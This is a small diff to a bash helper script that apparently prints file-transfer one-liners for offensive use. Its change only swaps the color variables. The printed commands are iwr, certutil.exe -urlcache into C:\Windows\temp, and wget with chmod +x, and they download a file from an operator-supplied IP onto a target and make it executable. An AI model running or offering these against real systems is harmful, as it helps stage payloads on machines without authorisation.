@@ -1,8 +1,8 @@
 #!/bin/bash
 
-# Define color codes
-PINK='\033[35m'
-RESET='\033[0m'
+# Define color codes ${PINK} for PINK and ${NC} to NC
+PINK='\033[38;2;255;105;180m'  # Pink RGB color
+NC='\033[0m'                   # No Color (NC)
 
 # Default values
 default_port=80
@@ -15,9 +15,9 @@ print_commands() {
     local file=$2
     local ip=$3
 
-    echo "1. ${PINK}iwr -uri http://$ip:$port/$file -o $file ${RESET}"
-    echo "2. ${PINK}certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file ${RESET}"
-    echo "3. ${PINK}wget http://$ip:$port/$file && chmod +x $file ${RESET}"
+    echo "1. ${PINK}iwr -uri http://$ip:$port/$file -o $file ${NC}"
+    echo "2. ${PINK}certutil.exe -urlcache -split -f http://$ip/$file C:\\Windows\\temp\\$file ${NC}"
+    echo "3. ${PINK}wget http://$ip:$port/$file && chmod +x $file ${NC}"
 }
 
 # Parse command line arguments
